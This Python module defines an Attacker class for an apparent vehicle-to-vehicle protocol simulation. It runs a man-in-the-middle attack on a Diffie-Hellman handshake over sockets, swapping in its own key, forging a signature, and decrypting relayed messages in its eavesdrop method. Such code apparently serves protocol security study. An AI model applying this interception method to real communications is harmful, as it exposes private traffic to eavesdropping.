import base64
import hashlib
import socket
import sys

import cryptography.hazmat.primitives.asymmetric.ec as ec
import pyDHE
from Crypto.Cipher import ChaCha20
from cryptography.hazmat.primitives import hashes

from .vehicle import Vehicle


class Attacker(Vehicle):

    def __init__(self, debug_mode: bool):
        super().__init__(debug_mode=debug_mode)
        self.__client: socket = None
        self.__server: socket = None
        self.__nonce: int = -1
        self.__shared_key_a: int = -1
        self.__shared_key_b: int = -1

    def eavesdrop(self, vehicle_a: Vehicle, vehicle_b: Vehicle):
        if vehicle_a.is_authenticated() and vehicle_b.is_authenticated():
            enc_msg = self.__server.recv(4096)
            cipher_at = self.__generate_cipher(shared_key=self.__shared_key_a, nonce=self.__nonce)
            msg = cipher_at.decrypt(base64.b64decode(s=enc_msg))
            print(f"Attacker: {msg}")
            cipher_tb = self.__generate_cipher(self.__shared_key_b, nonce=self.__nonce)
            base64.b64encode(s=cipher_tb.encrypt(msg))
            self.__client.send(enc_msg)
        else:
            print(f"Attacker: Attack failed.")

    def intrude(self, listen_addr: tuple[str, int], connect_addr: tuple[str, int]) -> socket:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.bind(listen_addr)
        client.listen(1)
        self.__server, addr = client.accept()
        self.__client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__client.connect(connect_addr)
        self.__mitm()

    def __mitm(self) -> None:
        msg = self.__server.recv(625)
        data = msg.decode("utf-8").split('>')
        pseudonym_a: str = data[0]
        self.__nonce = nonce_a = int(data[2])
        self.__client.send(msg)
        msg = self.__client.recv(1244)
        data = msg.decode("utf-8").split('>')
        pseudonym_b: str = data[0]
        certificate_b: str = data[1]
        nonce_b: int = int(data[2])
        dh_modulus_b: int = int(data[3])
        dhe: pyDHE.DHE = pyDHE.new()
        dh_modulus_t: int = dhe.getPublicKey()
        self.__server.send(f"{pseudonym_b}>{certificate_b}>{nonce_b}>{dh_modulus_t}>".encode())
        msg = self.__server.recv(759)
        data = msg.decode("utf-8").split('>')
        dh_modulus_a: int = int(data[0])
        enc_nonce_s_a: bytes = data[1].encode()
        self.__shared_key_a: int = dhe.update(B=dh_modulus_a)
        cipher_at = self.__generate_cipher(shared_key=self.__shared_key_a, nonce=nonce_a)
        nonce_s: int = int.from_bytes(bytes=cipher_at.decrypt(base64.b64decode(s=enc_nonce_s_a)),
                                      byteorder=sys.byteorder,
                                      signed=False)
        self.__shared_key_b: int = dhe.update(B=dh_modulus_b)
        cipher_tb = self.__generate_cipher(shared_key=self.__shared_key_b, nonce=nonce_a)
        enc_nonce_s_b: bytes = base64.b64encode(s=cipher_tb.encrypt(nonce_s.to_bytes(32, sys.byteorder, signed=False)))
        hash_t_content: bytes = f"{pseudonym_a}{pseudonym_b}{nonce_a}{nonce_b}{nonce_s}{dh_modulus_t}{dh_modulus_b}".encode()
        hash_t: bytes = hashlib.sha256(string=hash_t_content).hexdigest().encode()
        signature_t: bytes = base64.b64encode(s=self.get_private_key().sign(data=hash_t,
                                                                            signature_algorithm=ec.ECDSA(hashes.SHA256())))
        self.__client.send(f"{dh_modulus_t}>".encode() + enc_nonce_s_b + ">".encode() + signature_t)
        msg = self.__client.recv(96)
        self.__server.send(msg)

    def __generate_cipher(self, shared_key, nonce) -> ChaCha20:
        return ChaCha20.new(key=shared_key.to_bytes(length=256,
                                                    byteorder=sys.byteorder,
                                                    signed=False)[224:],
                            nonce=nonce.to_bytes(length=256,
                                                 byteorder=sys.byteorder,
                                                 signed=False)[232:])
